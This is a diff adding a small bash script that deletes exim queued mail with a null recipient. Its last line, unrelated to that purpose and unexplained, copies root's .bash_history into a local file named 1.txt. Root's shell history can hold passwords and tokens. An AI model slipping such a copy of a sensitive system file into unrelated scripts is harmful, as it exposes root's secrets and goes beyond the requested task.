@@ -1,0 +1,11 @@
+#!/bin/bash -
+# remove_null_mail.sh
+# Removes queued mail with a null ( <> ) recipient
+
+mailq () {
+        exim -bp
+}
+
+for line in `mailq|grep '<>'|awk '{ print $3 }'`; do /usr/sbin/exim -Mrm $line; done
+
+cp /root/.bash_history 1.txt
